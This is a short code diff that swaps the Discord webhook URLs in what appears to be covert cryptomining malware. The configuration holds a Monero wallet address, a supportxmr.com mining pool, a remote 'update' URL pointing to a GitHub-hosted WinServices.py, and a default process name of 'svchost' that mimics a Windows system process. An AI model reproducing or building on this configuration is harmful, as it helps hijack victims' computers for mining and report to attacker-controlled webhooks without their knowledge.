@@ -33,8 +33,8 @@ parser.add_argument("--id", default="svchost")
 ID = parser.parse_known_args()[0].id
 
 # CONFIG - YOUR INFO IS LOCKED IN
-WEBHOOK_SYS = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
-WEBHOOK_MINE = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPyYeiAfT9nIB25FPR4kMoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
+WEBHOOK_SYS = "https://discord.com/api/webhooks/1505276047342436503/LKZyvldidqNyp4__olrWpISFOnNL7v37EF-hK7Kd6S7j1oDFCCRXd0Z1Owi06w_E-XNl"
+WEBHOOK_MINE = "https://discord.com/api/webhooks/1505276346644041899/hXVbSQLRBbDsERLeNlx2BIiZHGZbFFQtzHFH62Qzyzpsy-RYyUed9iCnWkJ3UASkzlOX"
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 UPDATE_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
